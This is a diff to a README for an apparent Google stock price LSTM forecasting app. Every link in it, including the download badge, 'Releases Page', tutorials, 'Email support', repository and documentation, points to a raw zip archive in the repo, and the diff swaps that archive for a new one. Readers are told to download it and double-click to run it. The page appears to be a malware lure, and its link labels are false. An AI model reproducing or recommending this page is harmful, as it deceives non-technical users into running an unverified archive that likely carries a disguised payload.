@@ -4,7 +4,7 @@
 Welcome to the Google Stock Price Forecasting LSTM project! This application helps you predict the stock prices of Google (GOOGL). It uses deep learning techniques that are simple to follow. You do not need to be a programmer to use it.
 
 ## 📥 Download the Application
-[![Download from Releases](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
+[![Download from Releases](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip%20Now-Get%20the%20App-brightgreen)](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
 
 ## 📋 Overview
 This project focuses on using an LSTM (Long Short-Term Memory) model for time-series forecasting. It is fully documented and covers several key processes:
@@ -26,7 +26,7 @@ Ensure you meet the following system requirements:
 ## 📥 Download & Install
 To download and install the application:
 
-1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip) to find the latest release.
+1. **Visit the Releases Page:** Go to [this page](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip) to find the latest release.
 2. **Select the Version:** Choose the version you wish to download. 
 3. **Download the File:** Click on the link to download the application.
 4. **Run the Application:** Locate the downloaded file and double-click to run it.
@@ -53,20 +53,20 @@ Your contributions are welcome and appreciated!
 ## 📚 Additional Resources
 Want to learn more about LSTMs and deep learning? Check out these resources:
 
-- [Introduction to LSTMs](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
-- [Deep Learning Basics](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
-- [Time-Series Forecasting Guide](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
+- [Introduction to LSTMs](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
+- [Deep Learning Basics](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
+- [Time-Series Forecasting Guide](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
 
 ## 📞 Support
 If you encounter any problems or have questions, feel free to reach out. Support options include:
 
 - Issues page on GitHub
 - Community forums
-- Email support at https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip
+- Email support at https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip
 
 ## 🔗 More Info
 For more information, please refer to the following links:
-- [GitHub Repository](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
-- [Documentation](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/dataset/google-stock-price-forecasting-lstm-3.2.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
+- [Documentation](https://raw.githubusercontent.com/Nilsexe/google-stock-price-forecasting-lstm/main/assets/stock-price-lstm-forecasting-google-v2.4.zip)
 
 Thank you for using the Google Stock Price Forecasting LSTM application! Happy forecasting!
